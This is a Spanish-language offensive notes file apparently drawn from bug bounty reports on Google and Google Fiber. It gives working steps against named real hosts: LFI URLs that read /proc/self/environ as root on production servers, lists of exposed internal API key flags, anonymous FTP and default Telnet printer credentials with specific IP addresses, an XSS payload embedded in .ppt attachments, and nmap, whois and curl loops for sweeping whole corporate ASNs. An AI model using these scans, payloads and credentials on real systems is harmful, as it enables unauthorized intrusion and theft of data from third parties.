- `443` (HTTPS) — 34.120.121.40 (UPI payment gateway), 216.239.34.157 (chrome-proxy)
- `7777` — 34.83.45.88 (DremelGateway)
- `8080` — 34.75.135.42 (GOA server / Go Application framework)
- `9999` — 108.177.0.8, 100.8.125.10 (Mobile Harness)
- `443/springboard` — springboard.google.com (GWS prod)

**Rangos de IP de Google con hallazgos reales:**
- `34.x.x.x` — Google Cloud (GCP)
- `35.x.x.x` — Google Cloud (GCP)
- `100.8.x.x` — CGNAT interno expuesto
- `108.177.x.x` — Google prod
- `216.239.x.x` — Google prod (Chrome proxy infra)

**Usuarios observados en hallazgos reales (via /labelaclz o /proc/self/environ):**
| Usuario | Sistema | IP |
|---|---|---|
| `root` | DremelGateway, Mobile Harness, sync-service, GOA, GCS | múltiples |
| `gws-prod` | Google Web Server (Google Search) | springboard.google.com |
| `g00gl3` | Mobile Harness (device testing) | 108.177.0.8 |
| `chrome-proxy` | Chrome ConnectProxy | 216.239.34.157 |

**Nota:** El LFI es válido incluso cuando el proceso no corre como root — `chrome-proxy`, `gws-prod` son service accounts con acceso a datos sensibles de prod.

**Formato del /labelaclz con ACL groups (MDB):**
```
ACLs:
  admin: user/chrome-proxy  mdb/chrome-proxy
  read:
  modify:
  debugging: mdb/chrome-proxy-eng  user/chrome-proxy  mdb/drawbridge-blessed-debugging
```
- `mdb/` = Google's internal group system (Member Database)
- Los grupos `mdb/` expuestos revelan nombres de equipos internos de Google

**Convención de hostnames de prod de Google (via /proc/self/environ):**
- Formato: `<2-3 letras><número>.prod.google.com` (ej. `ill7`, `ilfh24`, `ilgm5`, `ilst9`)
- Múltiples hostnames = servicio detrás de load balancer → múltiples instancias expuestas

**Indicadores de framework por binary_name / hostname en /streamz:**
| Valor | Framework / Sistema |
|---|---|
| `com.google.devtools.mobileharness.*` | Mobile Harness (device testing) |
| `service` / `sync-service-*` | Kubernetes generic service |
| `server` + hostname `goa-*` | GOA (Google Go Application framework) |
| `LabServer` | Mobile Harness Lab Server |
| hostname `*-deployment-*-*` | Kubernetes Deployment |

**Workflow optimizado para encontrar estos servicios:**
```bash
# 1. Obtener IPs del ASN de Google
whois -h whois.radb.net -- '-i origin AS15169' | grep route | awk '{print $2}'

# 2. Escanear puertos conocidos de debug internos (actualizado con todos los puertos reales)
nmap -p 80,443,7777,8080,8888,9090,9999 --open <rango> -oG scan.txt

# 3. Probar todos los endpoints de debug en cada IP activa
for ip_port in $(cat scan.txt | grep "open" | awk '{print $2":"$NF}'); do
  for ep in labelaclz flagz statusz streamz procz varz reportcardz; do
    curl -s --max-time 3 "http://$ip_port/$ep" | grep -q "Owner Name\|root\|google\|unix_user" && echo "HIT: $ip_port/$ep"
  done
done
```

---

### 6. Google Fiber — FTP anonymous + Telnet default creds en servidores e impresoras de red
**Target:** Google Fiber (ASN googlefiber.net) | **IPs:** 136.61-63.x.x, 23.228.141.x

**Dos vectores en el mismo hallazgo:**

**Vector 1 — FTP anonymous login:**
```bash
ftp 136.32.102.4
# user: anonymous
# password: anonymous (o vacío)
```
- Activo en servidores y en impresoras Brother/HP expuestas en el rango de Google Fiber

**Vector 2 — Telnet con credenciales default en impresoras de red:**
```bash
telnet 23.228.141.115 23
# password: access
# user: admin
```
- Acceso admin completo a la impresora → control total del OS del dispositivo

**IPs documentadas:**
- Servidores FTP: `136.63.199.164`, `136.62.67.57`
- Impresoras Brother/HP con FTP anónimo: `136.61.146.5`, `136.62.53.228`, `136.63.72.2`, `23.228.141.115`
- Telnet con default creds: `136.63.72.2`, `23.228.141.115`

**Metodología de descubrimiento en ISPs/infraestructura de red:**
- Identificar el rango de IPs del ASN objetivo: `whois -h whois.radb.net -- '-i origin AS<NUM>'` o buscar `*.googlefiber.net` en Shodan
- Escanear puertos 21 (FTP) y 23 (Telnet) en el rango
- Probar FTP anónimo: `anonymous/anonymous`
- Probar Telnet con defaults de fabricante: Brother/HP → `admin/access`, `admin/admin`, `admin/` vacío
- **Herramienta:** `nmap -p 21,23 --open <rango> --script ftp-anon,telnet-encryption`

**Credenciales default por fabricante documentadas:**
| Fabricante | Protocolo | User | Password |
|---|---|---|---|
| Brother/HP printer | Telnet | admin | access |
| Huawei S7706 switch | HTTP | admin | admin@huawei.com |
| Generic FTP | FTP | anonymous | anonymous |

**Targets ideales:** ISPs con rangos CIDR grandes, infraestructura de red corporativa, impresoras y dispositivos IoT expuestos en rangos ASN de empresas tech

---

### 5. XSS via PowerPoint 97-2003 en Gmail iOS app y Google Drive iOS app
**Target:** Gmail iOS app v5.0.180121, Google Drive iOS v4.2018.05202 | **Plataforma:** iPhone 6, iOS 11.2.5

**Mismo vector que Atlassian/Slack/Trello — confirmado en productos Google:**
- Crear archivo `.ppt` con hipervínculo a `javascript:prompt(document.domain)`
- Guardar obligatoriamente como **"PowerPoint 97-2003 Presentation"** (.ppt) — no .pptx
- Enviar como adjunto de email a cualquier cuenta Gmail

**Vector Gmail:**
1. Abrir el adjunto `.ppt` en la Gmail iOS app
2. Hacer clic en el hipervínculo → XSS ejecutado

**Vector Google Drive:**
1. Copiar el adjunto a Google Drive desde la vista del email
2. Abrir en la Google Drive iOS app → clic en hipervínculo → XSS ejecutado

**Impacto:** Stored XSS en Gmail y Google Drive iOS — un atacante puede enviar el archivo a cualquier víctima y ejecutar JS en el contexto de las apps al abrir el adjunto

**Patrón consolidado — Office 97-2003 XSS en apps iOS (múltiples resoluciones):**
| Target | Formato | Estado |
|---|---|---|
| Atlassian Confluence | Word 97-2003 (.doc) | Resolved $300 |
| Slack files.slack.com | PowerPoint (.ppsx) | Not-applicable |
| Gmail iOS app | PowerPoint 97-2003 (.ppt) | Google VRP |
| Google Drive iOS app | PowerPoint 97-2003 (.ppt) | Google VRP |
| Trello iOS app | SVG | Resolved duplicate |

**Payload:** `javascript:prompt(document.domain)` como URL de hipervínculo en el documento

---

### 2. LFI en servidor Google prod — DremelGateway como ROOT con API keys expuestas
**Target:** Google prod server 34.83.45.88:7777 (DremelGateway) | **Criticidad:** Muy crítica

**Endpoints vulnerables descubiertos:**
- `/labelaclz` → confirma que el proceso corre como `root`
- `/flagz` → expone todas las flags de configuración del servicio, incluyendo API keys
- `/procz?file=/proc/self/cmdline` → **LFI** via parámetro `?file=` sin sanitizar — lee archivos arbitrarios del sistema como root

**API keys internas de Google expuestas via `/flagz`:**
- `--dremel_api_key`
- `--service_api_key`
- `--dremel_cloud_bigtable_request_api_key`

**Archivos legibles via LFI (`/procz?file=`):**
```
/proc/self/environ    → variables de entorno del proceso
/proc/self/cmdline    → argumentos de arranque
/proc/self/maps       → mapa de memoria del proceso
/proc/cpuinfo         → info del CPU del host
/proc/meminfo         → info de memoria
/proc/version         → versión del kernel
/proc/net/netstat     → estadísticas de red
```

**Confirmación de entorno prod/corp via `/flagz`:**
```
--cell_domain=.prod.google.com.
--census_tracing_collector_url=http://requestz.corp.google.com
--corplogin_loginservicenames=dremel.corp.google.com
--corplogin_server=https://login.corp.google.com
```

**Técnica de descubrimiento:**
- Escaneo de IPs en rangos ASN de Google en puertos no estándar (7777, 8080, 9090, etc.)
- Los servicios internos de Google usan endpoints de debug estándar: `/flagz`, `/procz`, `/varz`, `/statusz`, `/labelaclz`
- Estos endpoints exponen configuración interna cuando el servicio queda accesible públicamente

**Targets ideales para técnicas similares:**
- IPs de ASNs corporativos grandes en puertos no estándar (7777, 8888, 9999, etc.)
- Buscar en Shodan: `org:"Google" port:7777`, `org:"Amazon" port:8080 /flagz`
- Endpoints de diagnóstico internos expuestos: `/flagz`, `/varz`, `/statusz`, `/healthz`, `/debug`, `/admin`
- Parámetro `?file=` en cualquier endpoint de monitoreo → probar LFI con `/proc/self/environ`

---

### 4. Auth bypass + LFI en springboard.google.com — GWS production (Google Search servers)
**Target:** springboard.google.com/java/* | **Usuario:** gws-prod | **Criticidad:** Extrema

**Por qué es más crítico que los LFI en IPs raw:**
1. **Dominio oficial google.com** (no IP expuesta) — el servicio estaba publicado en un subdominio real de Google
2. **gws-prod = Google Web Server production** — los servidores que sirven Google Search
3. **Auth bypass** — había alguna forma de autenticación que fue omitida para acceder sin credenciales
4. **Load balancer** — cada refresh en `/procz` apuntaba a un backend diferente (`pwit4`, `pwon26`, `pwgn3`, `pwmk25` — todos en `*.prod.google.com`)

**Endpoints sin autenticación en springboard.google.com:**
```
/java/statusz      → panel de estado del servidor GWS (FrameworkInfo)
/java/labelaclz    → owner: gws-prod, policy: OPEN
/java/procz        → LFI completo sin auth
/java/statusz?v=gcz&jfr#!/  → garbage collection stats
```

**LFI via /java/procz:**
```
https://springboard.google.com/java/procz?file=/proc/self/environ
https://springboard.google.com/java/procz?file=/proc/cpuinfo
https://springboard.google.com/java/procz?file=/proc/self/maps
https://springboard.google.com/java/procz?file=/proc/meminfo
https://springboard.google.com/java/procz?file=/proc/version
https://springboard.google.com/java/procz?file=/proc/net/netstat
```

**Infraestructura interna de Google expuesta via /java/statusz:**
- BNS address: `/bns/pw/borg/pw/bns/gws-prod/gws1.serve/242` — Borg Name Service (sistema de orquestación interno de Google)
- DNS prod: `pwit4.prod.google.com:9857`
- Build label: `gws_20190326-0_RC1`, changelist `240294144`
- Ruta interna del depot: `//depot/branches/gws_release_branch/...`
- Memoria del servidor prod: 10.8GB / 18.1GB

**Técnica de descubrimiento — auth bypass en herramientas internas expuestas:**
- Buscar subdominios de empresas grandes que expongan herramientas internas sin auth real
- Palabras clave en subdominios: `springboard`, `internal`, `corp`, `tools`, `dashboard`, `admin`, `monitor`
- El prefijo `/java/` en las rutas es indicador de servicios basados en el framework interno de Google (Stubby/Borg)
- **Indicador crítico:** si `/labelaclz` responde sin auth → probar `/procz?file=` inmediatamente

**Lección sobre load balancers:**
- Cuando el LFI está detrás de un balanceador, cada request puede llegar a un backend diferente
- Hacer múltiples requests para mapear cuántos servidores están expuestos
- El hostname cambia en `/procz on <hostname>` con cada refresh

---

### 3. LFI en servidor Google como ROOT — port 80 (mismo patrón, variante en puerto estándar)
**Target:** Google prod server 34.94.39.119:80 | **Criticidad:** Muy crítica

**Diferencias clave vs reporte anterior (34.83.45.88:7777):**
- **Puerto 80** (HTTP estándar) en lugar de 7777 — confirma que estos servicios internos pueden quedar expuestos en cualquier puerto, incluyendo los estándar
- **LabelACL Policy: OPEN** (vs `OWNER_ONLY` anterior) — política más permisiva, acceso sin restricciones
- Sin `/flagz` reportado — pero mismo LFI via `/procz?file=` como root

**Patrón confirmado en múltiples IPs (hallazgo sistemático en ASN Google):**
- 34.83.45.88:7777 → DremelGateway, policy OWNER_ONLY, con /flagz y API keys internas
- 34.94.39.119:80 → policy OPEN, puerto estándar
- 35.227.157.158:80 → policy OPEN, misma configuración (CDD: Tue Jul 2 13:30:04 2019)

**Implicación:** La misma fecha de CDD (`Tue Jul 2 13:30:04 2019`) en múltiples IPs indica que son instancias del mismo servicio desplegado en batch — escanear el rango completo del ASN probablemente revelaría más instancias idénticas.

**Lección metodológica:**
- No limitarse a puertos no estándar — escanear también puerto 80/443 en IPs del ASN target
- El campo `Default LabelACL Policy: OPEN` indica exposición total sin restricciones de acceso
- Cuando `/labelaclz` confirma `Owner Name: root` → el LFI lee archivos con privilegios máximos
- **Workflow de reconocimiento masivo:**
  ```bash
  # Obtener rango de IPs del ASN de Google
  whois -h whois.radb.net -- '-i origin AS15169' | grep route

  # Escanear puertos comunes buscando /labelaclz
  nmap -p 80,443,7777,8080,8443,9090 <rango> --open -oG output.txt

  # Verificar endpoint en cada IP activa
  for ip in $(cat ips.txt); do curl -s "http://$ip/labelaclz" | grep "Owner Name" && echo $ip; done
  ```
